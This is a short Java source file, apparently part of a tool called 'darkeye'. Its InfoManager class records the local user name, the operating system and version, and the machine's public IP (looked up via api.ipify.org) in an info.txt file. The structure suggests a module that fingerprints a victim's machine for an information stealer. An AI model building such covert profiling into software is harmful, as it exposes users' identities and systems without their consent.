package org.spray.darkeye.managers;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import org.spray.darkeye.utils.HttpUtils;

public class InfoManager implements IManager {

	private String path;

	public InfoManager(String path) {
		this.path = path;
	}

	@Override
	public void run() {
		File file = new File(path, getPath());

		try {
			file.createNewFile();

			String info = "User: " + System.getProperty("user.name") + "\r\n" + "Ip: " + getIP() + "\r\n" + "OC: "
					+ System.getProperty("os.name") + System.getProperty("os.version");

			FileWriter fw = new FileWriter(file.getAbsoluteFile());
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(info);
			bw.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public String getIP() {
		String ip = "";
		try {
			ip = HttpUtils.readURLToString("https://api.ipify.org/");
		} catch (Exception e) {

		}
		return ip.replaceAll("[\\\r\\\n]+", "");
	}

	@Override
	public String getPath() {
		return "info.txt";
	}

}
